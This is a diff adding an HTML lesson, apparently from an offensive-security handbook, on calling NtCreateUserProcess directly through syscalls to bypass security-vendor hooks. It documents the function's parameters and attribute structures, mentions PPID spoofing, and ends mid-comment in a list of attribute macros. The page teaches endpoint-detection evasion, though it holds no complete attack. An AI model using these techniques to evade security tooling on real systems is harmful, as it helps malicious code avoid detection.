@@ -1,0 +1,1070 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Diving Into NtCreateUserProcess</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+        <div id="diving-into-ntcreateuserprocess" class="scroll-mt-24 pt-6 sm:pt-8 pb-3 border-b border-[#212b54] mt-8 sm:mt-12 mb-4 sm:mb-6 flex items-center justify-between group">
+            <h2 class="text-xl sm:text-2xl font-bold text-white tracking-tight flex items-center gap-2.5 sm:gap-3">
+                <i data-lucide="cpu" class="w-4 h-4 sm:w-5 sm:h-5 text-[var(--accent2)] flex-shrink-0"></i>
+                <span>Diving Into NtCreateUserProcess</span>
+            </h2>
+            <a href="#diving-into-ntcreateuserprocess" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition" class="opacity-0 group-hover:opacity-100 text-[#cbd5e1] hover:text-[var(--accent)] text-xs flex items-center gap-1 font-mono transition p-1.5 rounded hover:bg-[var(--accent-soft)]" title="Copy link">
+                <i data-lucide="link" class="w-4 h-4"></i>
+            </a>
+        </div><h3 id="introduction" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Introduction</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Up to this point in the handbook, the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">CreateProcess</code> WinAPI has been utilized for the creation of new processes. Nevertheless, it is worth noting that the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">CreateProcess</code> function ultimately invokes <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h#L2288" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">NtCreateUserProcess</a> after executing several internal functions, which may be hooked by security vendors. Thus, given the possibility of calling a hooked NtCreateUserProcess through <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">CreateProcess</code>, it becomes obligatory for us to invoke it directly via direct or indirect syscalls as a means of bypassing the potential hook installed.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The following is an image from the <a href="https://learn.microsoft.com/en-us/sysinternals/resources/windows-internals" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">Windows Internals 7th edition - Part 1</a> book, which shows <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">CreateProcess</code>&#x27;s execution flow. Note that functions marked with dotted boxes are internal functions.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/ntcreateuserprocess-119551140-8b599665-05e6-44b7-829c-fc1d43d6437d.jpg" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateUserProcess</code> is the final user-mode accessible function and represents the lowest level <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">CreateProcess</code> can reach before the kernel mode.</p><h3 id="ntcreateuserprocess-parameters" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>NtCreateUserProcess Parameters</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateUserProcess</code> function is a highly customizable function that has multiple parameters and performs complex operations.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">NTSTATUS NTAPI NtCreateUserProcess(
+    OUT         PHANDLE ProcessHandle,
+    OUT         PHANDLE ThreadHandle,
+    IN          ACCESS_MASK ProcessDesiredAccess,
+    IN          ACCESS_MASK ThreadDesiredAccess,
+    IN OPTIONAL POBJECT_ATTRIBUTES ProcessObjectAttributes,
+    IN OPTIONAL POBJECT_ATTRIBUTES ThreadObjectAttributes,
+    IN ULONG    ProcessFlags,                                    // PROCESS_CREATE_FLAGS_*
+    IN ULONG    ThreadFlags,                                     // THREAD_CREATE_FLAGS_*
+    IN OPTIONAL PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
+    IN OUT      PPS_CREATE_INFO CreateInfo,
+    IN          PPS_ATTRIBUTE_LIST AttributeList
+);</code></pre>
+        </div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ProcessHandle</code> - A pointer to a <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">HANDLE</code> variable that receives the handle of the newly created process.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ThreadHandle</code> - A pointer to a <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">HANDLE</code> variable that receives the handle to the main thread of the newly created process.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ProcessDesiredAccess</code> - Determines the granted access to the process handle and is of type <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ACCESS_MASK</code>. This module will use <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">PROCESS_ALL_ACCESS</code> to grant full access rights to the object.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ThreadDesiredAccess</code> - Determines the granted access to the thread handle and is of type <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ACCESS_MASK</code>. This module will use <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">THREAD_ALL_ACCESS</code> to grant full access rights to the object.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ProcessObjectAttributes</code> - This parameter specifies the attributes that can be applied to the process. The attributes are defined using the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">OBJECT_ATTRIBUTES</code> structure and are typically initialized using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-initializeobjectattributes" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">InitializeObjectAttributes</a> macro. For this module, this parameter will be set to <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NULL</code>.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ThreadObjectAttributes</code> - This parameter specifies the attributes that can be applied to the thread. The attributes are defined using the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">OBJECT_ATTRIBUTES</code> structure and are typically initialized using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-initializeobjectattributes" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">InitializeObjectAttributes</a> macro. For this module, this parameter will be set to <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NULL</code>.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ProcessFlags</code> - This is the flag that determines the initial state of the created process. For example, the process could be created in a suspended state or could inherit from its parent process. In this module, this flag will be set to <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NULL</code> to indicate that the process should be created in a normal state.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ThreadFlags</code> - This is the flag that determines the initial state of the main thread. In this module, this flag will be set to <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NULL</code> to indicate that the thread should be created in a normal state.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ProcessParameters</code> - An optional parameter, that points to an <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntrtl.h#L2635" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">RTL_USER_PROCESS_PARAMETERS</a> structure. This parameter describes the process&#x27;s initial arguments.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">CreateInfo</code> - This is a pointer to a <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h#L2207" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">PS_CREATE_INFO</a> structure that will hold returned information about the created process when the function succeeds.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">AttributeList</code> - This is a pointer to a <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h#L2060" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">PS_ATTRIBUTE_LIST</a> structure. The purpose of this parameter is to set up the attributes of the created process and thread. Recall that these are the same attributes that allow PPID spoofing and block DLL policy.</span></div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Note that the process name to be created is passed as an attribute using the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">AttributeList</code> parameter.</p><h3 id="ps-attribute-list-attributelist" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>PS_ATTRIBUTE_LIST AttributeList</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As mentioned above, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateUserProcess</code>&#x27;s last parameter is a pointer to a <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">PS_ATTRIBUTE_LIST</code> structure.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">typedef struct _PS_ATTRIBUTE_LIST
+{
+	SIZE_T TotalLength;
+	PS_ATTRIBUTE Attributes[1];
+
+} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;</code></pre>
+        </div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">TotalLength</code> - This is always set to the size of the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">PS_ATTRIBUTE_LIST</code> structure.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Attributes</code> - An array of <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h#L2048" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">PS_ATTRIBUTE</a> structure.</span></div><h3 id="ps-attribute-attributes" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>PS_ATTRIBUTE Attributes</span></h3>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">typedef struct _PS_ATTRIBUTE
+{
+	ULONG_PTR Attribute;
+	SIZE_T Size;
+	union
+	{
+		ULONG_PTR Value;
+		PVOID ValuePtr;
+	};
+	PSIZE_T ReturnLength;
+
+} PS_ATTRIBUTE, * PPS_ATTRIBUTE;</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The following elements should be initialized for every attribute added to the process:</p><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Attribute</code> - Set to the type of attribute.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Value</code> - The attribute value.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Size</code>: The size of the attribute value (size of <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Value</code>).</span></div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The parameters are similar to those used in the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">UpdateProcThreadAttribute</code> WinAPI function. The main difference is the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Attribute</code> member must use one of the values that are specific to the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateUserProcess</code> function. These values are shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">// Specifies the parent process of the new process
+#define PS_ATTRIBUTE_PARENT_PROCESS \
+    PsAttributeValue(PsAttributeParentProcess, FALSE, TRUE, TRUE)// Specifies the debug port to use
+#define PS_ATTRIBUTE_DEBUG_PORT \
+    PsAttributeValue(PsAttributeDebugPort, FALSE, TRUE, TRUE)// Specifies the token to assign to the new process
+#define PS_ATTRIBUTE_TOKEN \
+    PsAttributeValue(PsAttributeToken, FALSE, TRUE, TRUE)// Specifies the client ID to assign to the new process
+#define PS_ATTRIBUTE_CLIENT_ID \
+    PsAttributeValue(PsAttributeClientId, TRUE, FALSE, FALSE)// Specifies the TEB address to use for the new process
+#define PS_ATTRIBUTE_TEB_ADDRESS \
+    PsAttributeValue(PsAttributeTebAddress, TRUE, FALSE, FALSE)// Specifies the image name of the new process
+#define PS_ATTRIBUTE_IMAGE_NAME \
+    PsAttributeValue(PsAttributeImageName, FALSE, TRUE, FALSE)// Specifies the image information of the new process
+#define PS_ATTRIBUTE_IMAGE_INFO \
+    PsAttributeValue(PsAttributeImageInfo, FALSE, FALSE, FALSE)// Specifies the amount of memory to reserve for the new process
+#define PS_ATTRIBUTE_MEMORY_RESERVE \
+    PsAttributeValue(PsAttributeMemoryReserve, FALSE, TRUE, FALSE)// Specifies the priority class to use for the new process
+#define PS_ATTRIBUTE_PRIORITY_CLASS \
+    PsAttributeValue(PsAttributePriorityClass, FALSE, TRUE, FALSE)// Specifies the error mode to use for the new process
+#define PS_ATTRIBUTE_ERROR_MODE \
+    PsAttributeValue(PsAttributeErrorMode, FALSE, TRUE, FALSE)// Specifies the standard handle information to use for the new process
+#define PS_ATTRIBUTE_STD_HANDLE_INFO \
+    PsAttributeValue(PsAttributeStdHandleInfo, FALSE, TRUE, FALSE)// Specifies the handle list to use for the new process
+#define PS_ATTRIBUTE_HANDLE_LIST \
+    PsAttributeValue(PsAttributeHandleList, FALSE, TRUE, FALSE)// Specifies the group affinity to use for the new process
+#define PS_ATTRIBUTE_GROUP_AFFINITY \
+    PsAttributeValue(PsAttributeGroupAffinity, TRUE, TRUE, FALSE)// Specifies the preferred NUMA node to use for the new process
+#define PS_ATTRIBUTE_PREFERRED_NODE \
+    PsAttributeValue(PsAttributePreferredNode, FALSE, TRUE, FALSE)// Specifies the ideal processor to use for the new process
+#define PS_ATTRIBUTE_IDEAL_PROCESSOR \
+    PsAttributeValue(PsAttributeIdealProcessor, TRUE, TRUE, FALSE)// Specifies the process mitigation options to use for the new process
+#define PS_ATTRIBUTE_MITIGATION_OPTIONS \
+    PsAttributeValue(PsAttributeMitigationOptions, FALSE, TRUE, FALSE)// Specifies the protection level to use for the new process
+#define PS_ATTRIBUTE_PROTECTION_LEVEL \
+    PsAttributeValue(PsAttributeProtectionLevel, FALSE, TRUE, FALSE)// Specifies the UMS thread to associate with the new process
+#define PS_ATTRIBUTE_UMS_THREAD \
+    PsAttributeValue(PsAttributeUmsThread, TRUE, TRUE, FALSE)// Specifies whether the new process is a secure process
+#define PS_ATTRIBUTE_SECURE_PROCESS \
+    PsAttributeValue(PsAttributeSecureProcess, FALSE, TRUE, FALSE)// Specifies the job list to associate with the new process
+#define PS_ATTRIBUTE_JOB_LIST \
+    PsAttributeValue(PsAttributeJobList, FALSE, TRUE, FALSE)// Specifies the child process policy to use for the new process
+#define PS_ATTRIBUTE_CHILD_PROCESS_POLICY \
+    PsAttributeValue(PsAttributeChildProcessPolicy, FALSE, TRUE, FALSE)// Specifies the all application packages policy to use for the new process
+#define PS_ATTRIBUTE_ALL_APPLICATION_PACKAGES_POLICY \
+    PsAttributeValue(PsAttributeAllApplicationPackagesPolicy, FALSE, TRUE, FALSE)
+
+// Specifies the child process should have access to the Win32k subsystem.
+#define PS_ATTRIBUTE_WIN32K_FILTER	\
+    PsAttributeValue(PsAttributeWin32kFilter, FALSE, TRUE, FALSE)// Specifies the child process is allowed to claim a specific origin when making a safe file open prompt
